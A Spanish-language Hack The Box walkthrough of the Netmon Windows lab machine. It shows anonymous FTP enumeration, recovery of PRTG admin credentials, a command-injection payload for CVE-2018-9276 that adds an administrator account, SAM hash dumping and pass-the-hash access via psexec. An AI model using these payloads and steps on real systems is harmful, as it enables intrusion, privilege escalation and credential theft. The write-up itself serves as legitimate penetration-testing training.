---
title: "Netmon - Hack The Box"
date: 2023-01-16
draft: false
slug: "htb-writeup-netmon"
excerpt: "Esta es una máquina fácil que usa Windows y en la cual vamos a vulnerar el servicio SMB que está abierto en uno de los puertos a través de la enumeración del servicio FTP y de una vulnerabilidad en el servicio PRTG Network Monitor que nos permite inyectar código en dicho servicio, lo que nos va a permitir crear un usuario con privilegios de administrador siendo de esta forma en la que escalamos privilegios."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Windows", "SMB", "PRTG Network Monitor", "FTP Enumeration", "Remote Code Execution - Authenticated (RCE - Authenticated)", "CVE-2018-9276", "Privesc - CVE-2018-9276 (RCE - Authenticated)", "PassTheHash", "RDP", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "whatweb"
  - "ftp"
  - "crackmapexec"
  - "evil-winrm"
  - "psexec"
  - "xfreerdp"
  - "remmina"
links:
  - "https://www.cvedetails.com/cve/CVE-2018-9276/"
  - "https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html"
  - "https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/"
  - "https://www.mundodeportivo.com/urbantecno/windows/agrega-un-usuario-al-grupo-de-administradores-local-en-windows-via-comando"
  - "https://www.ngi.es/crackmapexec-post-explotacion-entornos-active-directory/"
  - "https://thehackerway.com/2021/11/04/evil-winrm-shell-sobre-winrm-para-pentesting-en-sistemas-windows-parte-1-de-2/"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-netmon/netmon_logo.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Realizamos un ping para saber si la máquina está conectada y para saber qué sistema operativo tiene, analizando el TTL.
```bash
ping -c 4 10.10.10.152
PING 10.10.10.152 (10.10.10.152) 56(84) bytes of data.
64 bytes from 10.10.10.152: icmp_seq=1 ttl=127 time=129 ms
64 bytes from 10.10.10.152: icmp_seq=2 ttl=127 time=128 ms
64 bytes from 10.10.10.152: icmp_seq=3 ttl=127 time=129 ms
64 bytes from 10.10.10.152: icmp_seq=4 ttl=127 time=132 ms

--- 10.10.10.152 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3012ms
rtt min/avg/max/mdev = 128.379/129.681/131.953/1.365 ms
```
Observamos que es una máquina Windows gracias al TLL. Ahora analicemos los puertos y servicios.

### Escaneo de Puertos {#Puertos}

Hacemos un escaneo de puertos para saber cuáles están abiertos y asi poder analizar los servicios que operan en estos:
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.152 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-16 13:32 CST
Initiating SYN Stealth Scan at 13:32
Scanning 10.10.10.152 [65535 ports]
Discovered open port 139/tcp on 10.10.10.152
Discovered open port 80/tcp on 10.10.10.152
Discovered open port 21/tcp on 10.10.10.152
Discovered open port 445/tcp on 10.10.10.152
Discovered open port 135/tcp on 10.10.10.152
Completed SYN Stealth Scan at 13:33, 27.19s elapsed (65535 total ports)
Nmap scan report for 10.10.10.152
Host is up, received user-set (1.3s latency).
Scanned at 2023-01-16 13:32:46 CST for 27s
Not shown: 55540 filtered tcp ports (no-response), 9990 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack ttl 127
80/tcp  open  http         syn-ack ttl 127
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.44 seconds
           Raw packets sent: 126822 (5.580MB) | Rcvd: 10051 (402.100KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Vemos varios puertos abiertos siendo el FTP, Web y SMB. Ahora vamos a analizar los servicios que hay en estos puertos.

### Escaneo de Servicios {#Servicios}

Una vez realizado el escaneo de puertos, hacemos un escaneo de servicios. Veamos con que nos encontramos:
```bash
nmap -sC -sV -p21,80,135,139,445 10.10.10.152 -oN targeted     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-16 13:34 CST
Nmap scan report for 10.10.10.152
Host is up (0.13s latency).

PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd

| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)

|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-server-header: PRTG/18.1.37.13946
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:

| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-01-16T19:34:28
|_  start_date: 2023-01-16T19:30:07
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2s, deviation: 0s, median: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.51 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Observamos que el **servicio FTP** tiene activo el login como **Anonymous** por lo que podemos empezar por ahí nuestra búsqueda de acceso a la máquina, también vemos el **servicio SMB** activo que podemos analizar después y por último vemos un **servicio web** abierto que podemos analizar a continuación.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Vamos a analizar la página web abierta antes de ir al **serivico FTP**, usaremos la herramienta **whatweb** para esto:

```bash
http://10.10.10.152/ [302 Found] Country[RESERVED][ZZ], HTTPServer[PRTG/18.1.37.13946], IP[10.10.10.152], PRTG-Network-Monitor[18.1.37.13946,PRTG], RedirectLocation[/index.htm], UncommonHeaders[x-content-type-options], X-XSS-Protection[1; mode=block]                                
ERROR Opening: http://10.10.10.152/index.htm - incorrect header check
```
Nos da un curioso error, una vez que entramos a la página web vemos el servicio que está usando, **PRTG Network Monitor (Netmon)**

¿Pero que chuchas es este servicio?

| **PRTG Network Monitor** |
|:-----------:|
| *PRTG es un software de monitoreo de red sin agentes de Paessler AG. El término general Paessler PRTG aúna varias versiones de software capaces de monitorizar y clasificar diferentes condiciones del sistema, como el uso del ancho de banda o el tiempo de actividad, y recopilar estadísticas de diversos anfitriones como switches, routers, servidores y otros dispositivos y aplicaciones.* |

![](/assets/images/htb-writeup-netmon/Captura1.png)

Osease que monitorea redes, esto es bastante útil así que investiguemos un poco más. 

Algo que podemos investigar, es donde se guarda las carpetas de instalación de este programa, puede que ahí se almacenen contraseñas o información critica que podamos usar.

### Información Útil del Servicio PRTG Network Monitor {#PRTG}

| Directorio de Programas                                                     | Directorio de Datos |
|-----------------------------------------------------------------------------|---------------------|
| *Sistemas de 32 bits: % archivos de programa% \ PRTG Network Monitor*       | *% programdata% \ Paessler \ PRTG Network Monitor -> Almacenamiento de datos* |
| *Sistemas de 64 bits: % archivos de programa (x86)% \ PRTG Network Monitor* |

**Para encontrar el camino correcto para la instalación de PRTG, por favor búsquelo en las propiedades de los iconos de PRTG el menú de inicio. Nota: Windows ProgramData está oculta por defecto.**

**Ojito con lo siguiente**, los siguientes archivos se almacenan en el **directorio de datos de PRTG**:

| Archivos Críticos en Directorio de Datos | Descripción |
|------------------------------------------|-------------|
| *PRTG Configuration.dat*                 | Configuración de monitoreo (por ejemplo, sondas, grupos, dispositivos, sensores, usuarios, mapas, informes y más) |
| *Configuración de PRTG.old*              | Copia de seguridad de la versión anterior de la configuración de monitoreo |

Aquí podemos ver más información:
* <a href="https://kb.rolosa.com/np-donde-almacena-la-informacion-prtg/" target="_blank">¿Dónde almacena la información PRTG?</a>

Tenemos mucha información crítica, el problema es ver si podemos revisar los archivos de la máquina, probemos primero con el **servicio FTP** y si no encontramos nada, investigaremos el **servicio SMB**.

### Enumeración Servicio FTP {#FTP}

De acuerdo al escaneo de servicios, el **servicio FTP** tiene activo el usuario **anonymous**, para entrar es tan simple como usar el usuario **anonymous** y poner una contraseña cualquiera:
```batch
ftp 10.10.10.152 
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:berserkwings): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
```

Bien, una vez dentro, vamos a investigar que hay:
```batch
ftp> ls
229 Entering Extended Passive Mode (|||50290|)
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||50292|)
125 Data connection already open; Transfer starting.
02-25-19  11:44PM       <DIR>          Administrator
02-03-19  12:35AM       <DIR>          Public
226 Transfer complete.
```

Vemos que si hay datos de la máquina, es decir, que el **servicio FTP** no esta correctamente configurado. Si te fijas en los usuarios se pueden ver 2 usuarios, no creo que podamos entrar al administrador, pero al **Public** sí que podremos:
```batch
ftp> cd Public
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||50294|)
150 Opening ASCII mode data connection.
02-03-19  08:05AM       <DIR>          Documents
07-16-16  09:18AM       <DIR>          Downloads
07-16-16  09:18AM       <DIR>          Music
07-16-16  09:18AM       <DIR>          Pictures
03-20-23  03:30PM                   34 user.txt
07-16-16  09:18AM       <DIR>          Videos
226 Transfer complete.
```
Vaya, vaya. Tan solo descargamos el archivo con el comando **get** y ya lo podremos leer. ¿Pero entonces como accedemos como root? Ya tenemos algunas pistas sobre donde buscar archivos que nos sean útiles para acceder a la página y podamos buscar un exploit para entrar a la máquina.

Empecemos a explotar las vulnerabilidades.

## Explotación de Vulnerabilidades {#Explotacion}

### Buscando Archivos Críticos de PRTG en Servicio FTP {#Busqueda}

Muy bien, ahora sabemos que podemos buscar dentro del **servicio FTP** para no estar dando tantas vueltas o buscando cosas que no sirven.
```batch
ftp> ls -la
229 Entering Extended Passive Mode (|||50613|)
125 Data connection already open; Transfer starting.
11-20-16  10:46PM       <DIR>          $RECYCLE.BIN
02-03-19  12:18AM                 1024 .rnd
11-20-16  09:59PM               389408 bootmgr
07-16-16  09:10AM                    1 BOOTNXT
02-03-19  08:05AM       <DIR>          Documents and Settings
02-25-19  10:15PM       <DIR>          inetpub
03-20-23  03:30PM            738197504 pagefile.sys
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
12-15-21  10:40AM       <DIR>          ProgramData
02-03-19  08:05AM       <DIR>          Recovery
02-03-19  08:04AM       <DIR>          System Volume Information
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows
226 Transfer complete.
ftp> cd ProgramData
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||50615|)
125 Data connection already open; Transfer starting.
12-15-21  10:40AM       <DIR>          Corefig
02-03-19  12:15AM       <DIR>          Licenses
11-20-16  10:36PM       <DIR>          Microsoft
02-03-19  12:18AM       <DIR>          Paessler
02-03-19  08:05AM       <DIR>          regid.1991-06.com.microsoft
07-16-16  09:18AM       <DIR>          SoftwareDistribution
02-03-19  12:15AM       <DIR>          TEMP
11-20-16  10:19PM       <DIR>          USOPrivate
11-20-16  10:19PM       <DIR>          USOShared
02-25-19  10:56PM       <DIR>          VMware
226 Transfer complete.
ftp> cd Paessler
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||50619|)
150 Opening ASCII mode data connection.
03-20-23  04:12PM       <DIR>          PRTG Network Monitor
226 Transfer complete.
ftp> cd PRTG\ Network\ Monitor
250 CWD command successful.
```
Una vez dentro de la carpeta donde están los archivos ocultos, descargamos él **.dat**, él **.old** y él **old.bak**, como investigamos anteriormente, sabemos que él **.dat** y él **.old** son lo mismo, siendo que el **.old** es un **BackUp** del **.dat**, así que descargaremos únicamente los **.dat** y él **.old.bak**. Lo que buscamos es ver si estos archivos contienen un usuario y contraseña que nos permitan acceder a la página.

### Analizando Contenido Descargado del Servicio FTP {#FTP2}

Ahora toca analizar los archivos que descargamos, recuerda que buscamos un usuario y contraseña para poder acceder a la página web.
```xml
cat PRTG\ Configuration.dat 
<?xml version="1.0" encoding="UTF-8"?>
  <root version="16" oct="PRTG Network Monitor 18.1.37.13946" saved="2/26/2019 2:54:23 AM" max="2017" guid="{221B25D6-9282-418B-8364-F59561032EE3}" treeversion="0" created="2019-02-02-23-18-27" trial="42f234beedd545338910317db1fca74dbe84030f">
    <statistics time="26-02-2019 02:50:23">
      <statistic name="State Changes">
        0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,3
      </statistic>
      <statistic name="Reports Generated">
        0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
      </statistic>
...
...
...
```

Al hacer un **cat** al archivo **.dat** vemos que hay demasiados datos por lo que hay que analizarlos de otra forma, ya que si vemos él **.old.bak** será lo mismo, demasiados datos. Vamos a usar el comando **diff** para ver las diferencias, junto con el comando **less** para ver el **output** como una página e ir viendo poco a poco toda la información, con el fin de ver si hay alguna diferencia entre estos dos archivos:
```bash
diff "PRTG Configuration.dat" "PRTG Configuration.old.bak" | less
```

Y vemos este resultado:
```xml
>       <geostat day="03-02-2019"/>
144,146c141,142
<               <flags>
<                 <encrypted/>
<               </flags>
---
>             <!-- User: prtgadmin -->
>             PrTg@dmin2018
317c313
<                 77RULO2GA4Q3RVEUZ77IMPLVKABRRS2UNR3Q====

```
Ahí estan nuestro usuario y contraseña que necesitamos, ahora vamos a autenticarnos, PERO recuerda que este es un archivo antiguo, por lo que la contraseña puede que no sea correcta, trata de sumarle un año más a la contraseña para que puedas acceder:

![](/assets/images/htb-writeup-netmon/Captura2.png)

## Post Explotación {#Post}

### Buscando y Analizando Exploit {#Exploit}

Una vez dentro, ya podemos buscar un Exploit que nos sirva porque ya tenemos la versión que esta usando el **servicio PRGT**:
```bash
searchsploit prtg
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path

|---|---|
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                                        | windows/webapps/46527.sh
PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS                                                       | windows/webapps/49156.txt
PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)                                    | windows_x86/dos/44500.py
PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                                                     | java/webapps/34108.txt

|---|---|
Shellcodes: No Results
Papers: No Results
```

Vamos a analizar este Exploit: **PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution**.
```bash
./Remote_Code_Execution.sh

[+]#########################################################################[+] 
[*] Authenticated PRTG network Monitor remote code execution                [*] 
[+]#########################################################################[+] 
[*] Date: 11/03/2019                                                        [*] 
[+]#########################################################################[+] 
[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
[+]#########################################################################[+] 
[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
[*] Version: 18.2.38                                                        [*] 
[*] CVE: CVE-2018-9276                                                      [*] 
[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
[+]#########################################################################[+] 

# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.
# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!' 

[+]#########################################################################[+] 
 EXAMPLE USAGE: ./prtg-exploit.sh -u http://10.10.10.10 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1"
```

El Exploit nos pide unas cookies, que podemos ver si inspeccionamos la página web y nos vamos a la sección de storage:

<p align="center">
<img src="/assets/images/htb-writeup-netmon/Captura9.png">
</p>

### Probando Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution {#Exploit2}

Vamos a ejecutar el programa con las cookies que nos pide:
```bash
chmod +x PRTG_exploit.sh

./PRTG_exploit.sh -u http://10.10.10.152 -c "_ga=GA1.4.1030767543.1673826713; _gid=GA1.4.459131971.1709957738; OCTOPUS1813713946=ezFBMkU1OTA4LTMxQ0EtNDg1Qy04NDVCLTI1NDk5ODJBQjBFQ30%3D _gat=1"

[+]#########################################################################[+] 
[*] Authenticated PRTG network Monitor remote code execution                [*] 
[+]#########################################################################[+] 
[*] Date: 11/03/2019                                                        [*] 
[+]#########################################################################[+] 
[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
[+]#########################################################################[+] 
[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
[*] Version: 18.2.38                                                        [*] 
[*] CVE: CVE-2018-9276                                                      [*] 
[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
[+]#########################################################################[+] 

# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.
# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!'                                                                                                                                       

[+]#########################################################################[+] 

 [*] file created 
 [*] sending notification wait....

 [*] adding a new user 'pentest' with password 'P3nT3st' 
 [*] sending notification wait....

 [*] adding a user pentest to the administrators group 
 [*] sending notification wait....

 [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun!
```

Y con esto, se supone que ya deberíamos de haber agregado un usuario y contraseña al grupo de administradores de la máquina víctima, vamos a comprobarlo con la herramienta **Crackmapexec**:
```bash
crackmapexec smb 10.10.10.152 -u 'pentest' -p 'P3nT3st!'
SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
SMB         10.10.10.152    445    NETMON           [-] netmon\pentest:P3nT3st! STATUS_LOGON_FAILURE
```

No dio resultado, es probable que esto sea así por la versión que maneja el Exploit y la que esta usando la máquina, así que vamos a probar de otra manera.

Existe un blog que explica como fue posible vulnerar esta versión del PRTG, incluso viene la referencia del blog en la que se basó el Exploit que acabamos de usar, así que veamos dicho blog y probemos esa forma: 
* <a href="https://www.codewatch.org/blog/?p=453" target="_blank">PRTG < 18.2.39 Command Injection Vulnerability</a>

### Probando Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution - Versión Blog {#Exploit3}

En resumen, podemos vulnerar la página usando las notificaciones, vamos a hacerlo de este modo:

![](/assets/images/htb-writeup-netmon/Captura3.png)

![](/assets/images/htb-writeup-netmon/Captura4.png)

Nos vamos a la sección de crear nueva notificación:

<p align="center">
<img src="/assets/images/htb-writeup-netmon/Captura5.png">
</p>

Llamamos a nuestra notificación **HackeadoPrro!** y nos vamos a la sección **Execute Programs**:

![](/assets/images/htb-writeup-netmon/Captura6.png)

Ahí lo que haremos, será casi lo mismo que en el blog, la diferencia va a radicar en que nosotros vamos a agregar el usuario al grupo de administradores, con el fin de poder loguearnos y ser root. 

Esto es lo mismo que hace el Exploit, pero nosotros lo vamos a indicar directamente en la inyección a diferencia del Exploit que usa la cookie para hacer esta movida, este será el código que ejecutara:
```bash
test.txt;net user BerserkP B3rs3rkP123$! /add; net localgroup Administrators BerserkP /add
```

Cuando guardemos la notificación, ya estará disponible:

<p align="center">
<img src="/assets/images/htb-writeup-netmon/Captura7.png">
</p>

Y simplemente la activamos, una vez activada nos deberá mandar el siguiente mensaje:

<p align="center">
<img src="/assets/images/htb-writeup-netmon/Captura8.png">
</p>

Bien ahora para poder ver si ya estamos dentro de dicho grupo, vamos a usar la herramienta **crackmapexec**:
```bash
crackmapexec smb 10.10.10.152 -u 'BerserkP' -p 'B3rs3rkP123$!'
SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
SMB         10.10.10.152    445    NETMON           [+] netmon\BerserkP:B3rs3rkP123$! (HackeadoPrro!)
```

### Accediendo a la Máquina como Administrador {#Root}

Vemos que ya está nuestro usuario, ahora lo que sigue será conectarnos ya directamente, para esto usaremos la herramienta **evilWinrm**:
```bash
evil-winrm -i 10.10.10.152 -u 'BerserkP' -p 'B3rs3rkP123$!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\BerserkP\Documents> whoami
netmon\berserkp
```
Ya solo es cuestión de buscar la flag del root, que siempre está en el escritorio del usuario Administrator y listo.

### Obteniendo Información Extra y Otras Formas de Acceder a la Máquina {#Extras}

Una vez que hemos podido agregar nuestras contraseñas al grupo de administradores, podemos aprovechar para obtener los SAM Hashes de todos los admins, esto lo podemos hacer con **Crackmapexec** de la siguiente manera:
```bash
crackmapexec smb 10.10.10.152 -u 'BerserkP' -p 'B3rs3rkP123$!' --sam
SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
SMB         10.10.10.152    445    NETMON           [+] netmon\BerserkP:B3rs3rkP123$! (Pwn3d!)
SMB         10.10.10.152    445    NETMON           [+] Dumping SAM hashes
SMB         10.10.10.152    445    NETMON           Administrator:...:...:...:::
SMB         10.10.10.152    445    NETMON           Guest:...:...:...:::
SMB         10.10.10.152    445    NETMON           DefaultAccount:...:...:...:::
SMB         10.10.10.152    445    NETMON           BerserkP:...:...:...:::
SMB         10.10.10.152    445    NETMON           [+] Added 4 SAM hashes to the database
```

Estos hashes los podemos usar para aplicar un **PassTheHash** para conectarnos usando otras herramientas, por ejemplo, la herramienta **psexec** y si estuviera abierto el protocolo RDP, sería con la herramienta **xfreerdp**, vamos a probar con cada una.

| **PassTheHash** |
|:-----------:|
| *En seguridad informática, pasar el hash es una técnica de piratería que permite a un atacante autenticarse en un servidor o servicio remoto utilizando el hash NTLM o LanMan subyacente de la contraseña de un usuario, en lugar de solicitar la contraseña de texto sin formato asociada como suele ser el caso.* |

#### Accediendo a la Máquina con Psexec {#psexec}

Por defecto, deberías tener instalado el **psexec.py**, buscalo con el comando **locate**:
```bash
locate psexec.py
/usr/local/bin/psexec.py
/usr/share/doc/python3-impacket/examples/psexec.py
```

En mi caso, voy a copiar el del directorio **impacket** y lo voy a usar desde donde lo tenga copiado:
```bash
cp /usr/share/doc/python3-impacket/examples/psexec.py .
```

Y ahora, vamos a usarlo, utilizando la parte final del hash perteneciente al usuario administrador:
```bash
python3 psexec.py WORKGROUP/Administrator@10.10.10.152 -hashes :d0f7...
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.152.....
[*] Found writable share ADMIN$
[*] Uploading file AYHbMdFh.exe
[*] Opening SVCManager on 10.10.10.152.....
[*] Creating service Fomi on 10.10.10.152.....
[*] Starting service Fomi.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Listo, ganamos acceso utilizando la herramienta **psexec.py**.

#### Accediendo a la Máquina con xfreerdp - Remmina {#rdp}

Para este caso, vamos a primero levantar el **servicio RDP** utilizando **Crackmapexec**, para esto tambien puedes usar el usuario administrador y su hash o tu usuario, queda a tu elección:
```bash
crackmapexec smb 10.10.10.152 -u 'BerserkP' -p 'B3rs3rkP123$!' -M rdp -o action=enable
SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
SMB         10.10.10.152    445    NETMON           [+] netmon\BerserkP:B3rs3rkP123$! (Pwn3d!)
RDP         10.10.10.152    445    NETMON           [+] RDP enabled successfully
```

E igual, podemos comprobar con **nmap**, que este servicio ya esta operando en la máquina:
```bash
nmap -p 3389 --open -T5 -vvv -n -Pn 10.10.10.152
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) CST
Initiating SYN Stealth Scan at 23:22
Scanning 10.10.10.152 [1 port]
Discovered open port 3389/tcp on 10.10.10.152
Completed SYN Stealth Scan at 23:22, 0.15s elapsed (1 total ports)
Nmap scan report for 10.10.10.152
Host is up, received user-set (0.066s latency).

PORT     STATE SERVICE       REASON
3389/tcp open  ms-wbt-server syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
           Raw packets sent: 1 (44B) | Rcvd: 1 (44B)
```

Ahora, usemos la herramienta **xfreerdp** para conectarnos a la consola:
```bash
xfreerdp /u:BerserkP /p:B3rs3rkP123$! /v:10.10.10.152:3389
```
No nos deja conectarnos, es posible que sea por como esta configurada la máquina en HTB, pero usemos otra herramienta muy similar a **xfreerdp** que se llama **remmina**, vamos a instalarla primero:
```bash
apt install remmina
```

Y vamos a ejecutarla:
```bash
remmina
```

Observa que nos pide una IP a la cual conectarnos, usemos la de la máquina:

<p align="center">
<img src="/assets/images/htb-writeup-netmon/Captura10.png">
</p>

